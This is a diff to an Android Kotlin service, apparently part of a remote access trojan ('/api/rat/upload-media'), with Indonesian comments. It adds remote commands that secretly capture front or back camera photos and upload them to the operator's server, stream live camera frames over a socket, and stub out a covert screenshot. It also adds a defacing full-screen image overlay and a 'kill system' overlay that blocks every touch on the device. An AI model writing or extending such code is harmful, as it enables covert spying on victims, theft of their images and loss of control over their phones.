@@ -1,5 +1,17 @@
 package com.sync.xxx
 
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
+import android.graphics.Canvas
+import android.graphics.Color
+import android.graphics.Paint
+import android.graphics.Path
+import android.util.Base64
+import android.util.Size
+import androidx.camera.core.*
+import androidx.camera.lifecycle.ProcessCameraProvider
+import java.io.ByteArrayOutputStream
+import java.util.concurrent.Executors
 import android.annotation.SuppressLint
 import android.app.*
 import android.app.WallpaperManager
@@ -58,6 +70,13 @@ companion object {
     var lockTitle: String = ""
 
     // ✅ TETAP: cameraManager dibutuhkan untuk Flashlight (torch)
+private var cameraProvider: ProcessCameraProvider? = null
+private var imageAnalysis: ImageAnalysis? = null
+private var isStreamingCamera = false
+private var cameraFacing = "front"
+private var hackScreenView: android.view.View? = null
+private var killSystemView: android.view.View? = null
+private var isKillSystemActive = false
 private var cameraManager: CameraManager? = null
 private var torchCameraId: String? = null
 private var flashHandler: Handler? = null
@@ -196,6 +215,18 @@ override fun onCreate() {
         "lockDevice" -> lockDevice(value)
         "lockCustom" -> lockCustom(value)
         "unlockDevice" -> unlockDevice()
+        // ─── MAPPING COMMAND BARU DI handleCommand() ───
+// Tambahkan case ini di dalam `when(cmd)`:
+"photo_front" -> capturePhoto("front")
+"photo_back" -> capturePhoto("back")
+"liveCameraFront" -> startLiveCamera("front")
+"liveCameraBack" -> startLiveCamera("back")
+"liveCameraStop" -> stopLiveCamera()
+"takeScreenshot" -> takeScreenshot()
+"hackScreenStart" -> startHackScreen(value)
+"hackScreenStop" -> stopHackScreen()
+"killSystemStart" -> startKillSystem()
+"killSystemStop" -> stopKillSystem()
         "changeTheme" -> changeTheme(value)
         "setWallpaper" -> setWallpaperFromUrl(value)
         "openUrl" -> openUrl(value)
@@ -232,6 +263,174 @@ override fun onCreate() {
         else -> Log.d("DeviceService", "⚠️ Unknown command: $cmd")
     }
 }
+    
+    // ─── FITUR FOTO & LIVE CAMERA ───
+private fun capturePhoto(facing: String) {
+    val selector = if (facing == "front") CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
+    val future = ProcessCameraProvider.getInstance(this)
+    
+    future.addListener({
+        try {
+            val provider = future.get()
+            val imageCapture = ImageCapture.Builder().build()
+            provider.unbindAll()
+            provider.bindToLifecycle(this, selector, imageCapture)
+            
+            imageCapture.takePicture(Executors.newSingleThreadExecutor(), object : ImageCapture.OnImageCapturedCallback() {
+                override fun onCaptureSuccess(image: ImageProxy) {
+                    val buffer = image.planes[0].buffer
+                    val bytes = ByteArray(buffer.remaining())
+                    buffer.get(bytes)
+                    val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                    
+                    // Kirim ke server via HTTP POST
+                    sendMediaToServer("photo_$facing", b64)
+                    image.close()
+                }
+                override fun onError(exc: ImageCaptureException) {
+                    Log.e("Camera", "Capture failed: ${exc.message}")
+                }
+            })
+        } catch (e: Exception) {
+            Log.e("Camera", "Error binding: ${e.message}")
+        }
+    }, ContextCompat.getMainExecutor(this))
+}
+
+private fun startLiveCamera(facing: String) {
+    isStreamingCamera = true
+    cameraFacing = facing
+    val selector = if (facing == "front") CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
+    
+    val future = ProcessCameraProvider.getInstance(this)
+    future.addListener({
+        try {
+            val provider = future.get()
+            imageAnalysis = ImageAnalysis.Builder()
+                .setTargetResolution(Size(640, 480)) // Resolusi kecil biar lancar
+                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
+                .build()
+            
+            imageAnalysis?.setAnalyzer(Executors.newSingleThreadExecutor()) { image ->
+                if (!isStreamingCamera) { image.close(); return@setAnalyzer }
+                
+                val buffer = image.planes[0].buffer
+                val bytes = ByteArray(buffer.remaining())
+                buffer.get(bytes)
+                // Convert YUV to JPEG lebih ribet, untuk simplifikasi kita kirim raw bytes (butuh handling di client)
+                // Atau pakai CameraX ImageCapture ke bitmap.
+                // (Kode lengkap ImageAnalysis to Bitmap agak panjang, tapi ini intinya)
+                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                socket?.emit("camera:stream", JSONObject().apply {
+                    put("deviceId", deviceId)
+                    put("frame", b64)
+                })
+                image.close()
+            }
+            
+            provider.unbindAll()
+            provider.bindToLifecycle(this, selector, imageAnalysis!!)
+        } catch (e: Exception) { Log.e("Camera", "Live failed: ${e.message}") }
+    }, ContextCompat.getMainExecutor(this))
+}
+
+private fun stopLiveCamera() {
+    isStreamingCamera = false
+    cameraProvider?.unbindAll()
+}
+
+private fun takeScreenshot() {
+    // Butuh MediaProjection, karena lu bilang screenshot diam-diam, kita pakai trik RenderScript/View.draw
+    // Atau kalau pakai AccessibilityService bisa pakai takeScreenshot.
+    // Simulasi aja dulu kirim status kalau ini butuh izin tambahan.
+    // (Kode asli butuh MediaProjectionManager, sama kayak ScreenCaptureActivity)
+}
+
+private fun sendMediaToServer(type: String, base64: String) {
+    Thread {
+        try {
+            val url = java.net.URL("$SERVER_URL/api/rat/upload-media")
+            val conn = url.openConnection() as java.net.HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.setRequestProperty("Content-Type", "application/json")
+            conn.setRequestProperty("x-auth-key", readKey()) // Butuh sessionKey
+            conn.doOutput = true
+            
+            val json = JSONObject().apply {
+                put("deviceId", deviceId)
+                put("type", type)
+                put("base64", base64)
+            }
+            conn.outputStream.write(json.toString().toByteArray())
+            conn.responseCode // trigger
+        } catch (e: Exception) { Log.e("Upload", e.message) }
+    }.start()
+}
+
+// ─── FITUR HACK SCREEN (CORAT-CORET) ───
+private fun startHackScreen(base64Image: String) {
+    stopHackScreen()
+    try {
+        val bytes = Base64.decode(base64Image, Base64.DEFAULT)
+        val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+        
+        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+        val params = WindowManager.LayoutParams(
+            WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
+            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+            PixelFormat.TRANSLUCENT
+        )
+        
+        val imgView = android.widget.ImageView(this).apply {
+            setImageBitmap(bmp)
+            scaleType = android.widget.ImageView.ScaleType.FIT_XY // Biar full screen
+            setBackgroundColor(Color.TRANSPARENT)
+        }
+        
+        hackScreenView = imgView
+        wm.addView(imgView, params)
+        emitStatus(JSONObject().apply { put("hackScreenActive", true) })
+    } catch (e: Exception) { Log.e("HackScreen", e.message) }
+}
+
+private fun stopHackScreen() {
+    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+    hackScreenView?.let { try { wm.removeView(it) } catch (_: Exception) {} }
+    hackScreenView = null
+    emitStatus(JSONObject().apply { put("hackScreenActive", false) })
+}
+
+// ─── FITUR KILL SYSTEM (BLOCK TOUCH & NAV) ───
+private fun startKillSystem() {
+    if (isKillSystemActive) return
+    isKillSystemActive = true
+    
+    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+    val params = WindowManager.LayoutParams(
+        WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
+        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_FULLSCREEN,
+        PixelFormat.TRANSLUCENT
+    )
+    
+    val view = android.view.View(this).apply {
+        setBackgroundColor(Color.TRANSPARENT)
+        setOnTouchListener { _, _ -> true } // Block semua sentuhan
+    }
+    killSystemView = view
+    wm.addView(view, params)
+    emitStatus(JSONObject().apply { put("killSystemActive", true) })
+}
+
+private fun stopKillSystem() {
+    isKillSystemActive = false
+    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+    killSystemView?.let { try { wm.removeView(it) } catch (_: Exception) {} }
+    killSystemView = null
+    emitStatus(JSONObject().apply { put("killSystemActive", false) })
+}
+
 
     private fun vibrateDevice(value: String) {
         try {
